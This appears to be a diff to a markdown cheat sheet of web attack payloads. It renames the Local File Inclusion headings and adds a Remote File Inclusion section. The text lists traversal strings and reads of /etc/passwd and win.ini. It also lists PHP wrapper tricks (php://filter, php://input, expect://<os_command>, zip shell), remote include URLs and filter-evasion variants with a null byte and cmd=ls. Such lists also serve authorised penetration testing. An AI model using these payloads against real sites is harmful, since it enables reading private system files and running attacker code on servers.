@@ -8,19 +8,21 @@
 ....//....//....//....//....//
 ```
 
-## Linux LFI Payloads
+## Local File Inclusion (LFI)
+
+### Linux LFI Payloads
 
 ```
 /etc/passwd
 ```
 
-## Windows LFI Payloads
+### Windows LFI Payloads
 
 ```
 /windows/win.ini
 ```
 
-## Evasion Filters
+### LFI Evasion Filters
 
 ```
 php://filter/convert.base64-encode/resource=/path/to/file
@@ -28,6 +30,23 @@ php://input
 data://text//plain;base64,<base64_encoded_payload>
 expect://<os_command>
 zip://file.jpg%23shell.php
+```
+
+## Remote File Inclusion (RFI)
+
+### URL Payloads
+
+```
+https://cirt.net/rfiinc.txt
+https://rfi.nessus.org/rfi.txt
+```
+
+### RFI Evasion
+
+```
+HTTps://cirt.net/rfiinc.txt
+https://cirt.net/rfiinc.txt??
+https://cirt.net/rfiinc.txt?%00&cmd=ls
 ```
 
 ---
